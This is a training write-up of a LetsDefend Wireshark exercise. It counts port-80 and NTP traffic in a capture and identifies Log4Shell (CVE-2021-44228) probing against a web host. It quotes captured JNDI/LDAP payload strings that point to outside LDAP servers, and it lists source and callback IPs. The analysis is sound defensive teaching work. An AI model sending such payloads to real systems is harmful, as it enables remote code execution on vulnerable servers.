# Wireshark Traffic Analysis — LetsDefend Challenge

<details>
<summary>Report metadata</summary>

| Field | Value |
|---|---|
| Platform | LetsDefend |
| Tool | Wireshark |
| Capture | `Challenge.pcap` |
| Category | Network traffic analysis / suspicious HTTP traffic |
| Analyst | Portfolio author |
| Capture dates observed | 17–18 December 2021 |
| Report status | Evidence documented from screenshots; conclusions are limited to the captured evidence |
| Lab | [Malware Traffic Analysis with Wireshark](https://app.letsdefend.io/training/lessons/malware-traffic-analysis-with-wireshark) |

</details>

## 1. Executive summary

This exercise examined the `Challenge.pcap` capture in Wireshark. The capture contains 80,843 packets. A destination-port filter identified 9,410 TCP packets directed to port 80 (11.6% of the capture), and a separate endpoint-pair filter displayed 424 NTPv4 packets between `198.71.247.91` and `91.189.89.199`.

The investigation also identified HTTP requests containing JNDI/LDAP lookup strings associated with Log4Shell-style probing. A specific filter for the string `31.131.16.127` returned eight packets involving two source IP addresses — `46.105.95.220` and `104.248.144.120` — communicating with `198.71.247.91`. The packet evidence demonstrates exploit-like requests, but does **not** prove that the target was vulnerable or that code execution succeeded.

## 2. Objective and scope

- **Objective:** inspect endpoints, quantify traffic to TCP/80, examine a selected IP-to-IP conversation, and identify HTTP requests containing JNDI/LDAP exploit strings.
- **Authorized environment:** LetsDefend training exercise.
- **Scope:** the supplied `Challenge.pcap` file and the packets visible through the filters documented below.
- **Out of scope:** scanning or interacting with external systems; verifying whether the target host was actually compromised.

## 3. Environment and tools

| Item | Details |
|---|---|
| Operating system | Windows (visible in the workstation screenshot) |
| Tool | Wireshark |
| Capture | `Challenge.pcap` |
| Total packets | 80,843 |
| Wireshark version | Not recorded |

## 4. Investigation methodology

The following display filters were used:

| Display filter | Purpose | Observed result |
|---|---|---|
| `tcp.dstport == 80` | Show TCP packets whose destination port is 80 | 9,410 packets (11.6%) |
| `ip.addr == 91.189.89.199 and ip.addr == 198.71.247.91` | Isolate traffic between the two specified IPv4 addresses | 424 packets; NTPv4 client/server traffic |
| `frame contains "jndi"` | Find frames containing the string `jndi` | 25 packets |
| `frame contains "jndi" and frame contains "31.131.16.127"` | Narrow the search to frames containing both strings | 8 HTTP packets |

### Endpoint statistics

The IPv4 Endpoints window showed three endpoints while **Limit to display filter** was enabled. Therefore, these figures describe the filtered JNDI/LDAP-related packets, not every endpoint in the complete 80,843-packet capture.

| IPv4 address | Packets | Bytes | Direction shown |
|---|---:|---:|---|
| `46.105.95.220` | 4 | 983 | 4 transmitted, 0 received |
| `104.248.144.120` | 4 | 983 | 4 transmitted, 0 received |
| `198.71.247.91` | 8 | 1,966 | 0 transmitted, 8 received |

The endpoint view is consistent with two source hosts sending four HTTP packets each to `198.71.247.91`.

## 5. Findings

### F-01 — TCP traffic to destination port 80

The filter `tcp.dstport == 80` displayed **9,410 packets out of 80,843 (11.6%)**.

This count applies specifically to TCP packets whose **destination** port is 80. It should not be described as the total of all HTTP traffic in both directions.

### F-02 — Communication between two IPv4 addresses

The filter `ip.addr == 91.189.89.199 and ip.addr == 198.71.247.91` displayed **424 packets (0.5%)**.

The visible packet list identifies the traffic as **NTP Version 4**, with client and server messages travelling between:

- `198.71.247.91`
- `91.189.89.199`

This is a separate observed conversation; the screenshot does not establish that it is related to the JNDI activity.

### F-03 — JNDI/LDAP request strings

The specific filter `frame contains "jndi" and frame contains "31.131.16.127"` displayed **8 HTTP packets**.

The visible request payload includes:

```text
GET /\${jndi:ldap://31.131.16.127:1389/Exploit} HTTP/1.1
Host: 198.71.247.91
```

The two source addresses were:

| Source IP | Destination IP | Packets shown |
|---|---|---:|
| `46.105.95.220` | `198.71.247.91` | 4 |
| `104.248.144.120` | `198.71.247.91` | 4 |

The LDAP address `31.131.16.127:1389` appears inside the HTTP JNDI string. In the displayed packets, the actual IP destination is `198.71.247.91`; the screenshot does **not** show a separate network connection to `31.131.16.127:1389`.

### F-04 — Additional JNDI match in the broader search

The broader filter `frame contains "jndi"` displayed 25 packets. One visible request from `195.54.160.149` to `198.71.247.91` contains a URI beginning:

```text
${jndi:ldap://195.54.160.149:12344/...
```

This is another JNDI/LDAP-style probe visible in the capture. The screenshot also shows packets from `49.7.224.217` matching the broad frame filter, but their visible request summary is only `GET /`. The request details must be inspected before classifying that host as an exploit source.

### Indicators and relevant addresses

| Role | Address | Evidence / interpretation |
|---|---|---|
| HTTP target observed | `198.71.247.91` | Destination of the HTTP requests |
| Source of specific JNDI probe | `46.105.95.220` | Four packets in the specific filtered result |
| Source of specific JNDI probe | `104.248.144.120` | Four packets in the specific filtered result |
| LDAP endpoint embedded in payload | `31.131.16.127:1389` | Referenced in the JNDI string; not shown as a separate packet destination |
| Additional JNDI probe source / embedded LDAP endpoint | `195.54.160.149:12344` | Address and port appear in a separate JNDI string |

## 6. Analysis and assessment

### Observed facts

- The capture contains 80,843 packets.
- 9,410 packets match `tcp.dstport == 80`.
- 424 packets match the selected IP pair and are identified as NTPv4.
- Eight packets match both `jndi` and `31.131.16.127`.
- Those eight packets involve two HTTP source addresses: `46.105.95.220` and `104.248.144.120`.
- A broader JNDI search also reveals a request from `195.54.160.149` containing a JNDI/LDAP string.

### Interpretation

The string `${jndi:ldap://...}` is consistent with probing for the Log4Shell vulnerability family, associated with **CVE-2021-44228**. The vulnerability concerns attacker-controlled JNDI lookups in affected Apache Log4j 2 configurations. The payload is evidence of an attempted exploit or vulnerability probe, not evidence by itself that exploitation succeeded.

### Limitations

- The screenshots do not establish the Log4j version or configuration on the target.
- They do not show a confirmed LDAP callback or successful execution of a second-stage payload.
- The broader `frame contains "jndi"` filter can match any occurrence in a frame. Each candidate source must be checked at packet-detail level before it is labelled an exploit source.
- IP addresses are reported as observed in the training capture; no independent attribution or reputation assessment was performed.

**Assessment:** suspicious — multiple HTTP requests contain JNDI/LDAP lookup strings consistent with Log4Shell probing. Successful compromise is **not confirmed** by the supplied evidence.

## 7. Conclusion and recommended actions

The capture contains multiple JNDI/LDAP-style HTTP probes against `198.71.247.91`. The specific payload referencing `31.131.16.127:1389` is associated with two source IP addresses: `46.105.95.220` and `104.248.144.120`. A separate broader-filter result shows another JNDI-style request from `195.54.160.149`.

In a real SOC investigation, recommended next steps would be:

1. Correlate the request timestamps with web-server and application logs.
2. Identify the Apache Log4j version and configuration used by the target application.
3. Search logs for JNDI lookup patterns and related outbound LDAP connections.
4. Check endpoint telemetry for evidence of child processes, downloaded files, or unexpected outbound activity.
5. Apply the vendor-recommended security update for any affected Log4j component and restrict unnecessary outbound LDAP traffic.

## 8. Skills demonstrated

- [x] Wireshark packet-list and endpoint-statistics review
- [x] Display-filter usage
- [x] TCP destination-port filtering
- [x] IP-pair conversation filtering
- [x] HTTP payload inspection
- [x] Identification of JNDI/LDAP-style exploit strings
- [x] Evidence-based assessment and statement of limitations
- [ ] Correlation with server or endpoint logs (not included in this exercise evidence)

## 9. Evidence

Add sanitized screenshots to the `screenshots/` directory. Suggested filenames:

- `01-endpoints-overview.png`
- `02-tcp-destination-port-80.png`
- `03-ip-pair-ntp-conversation.png`
- `04-jndi-specific-callback-filter.png`
- `05-jndi-broad-search.png`

Only publish screenshots if the training platform permits publication. Do not publish the raw training PCAP unless redistribution is explicitly authorized. Review and redact unrelated or sensitive details before committing images.

## 10. References

- [LetsDefend — Malware Traffic Analysis with Wireshark](https://app.letsdefend.io/training/lessons/malware-traffic-analysis-with-wireshark)
- [Wireshark User's Guide](https://www.wireshark.org/docs/wsug_html_chunked/)
- [Wireshark Display Filter Reference](https://www.wireshark.org/docs/dfref/)
- [CVE.org — CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228)
- [Apache Logging Services — Security](https://logging.apache.org/security.html)

---

**Disclaimer:** This is an educational analysis of a LetsDefend training capture. The assessment is based only on the visible packet evidence and does not establish compromise of a live system.
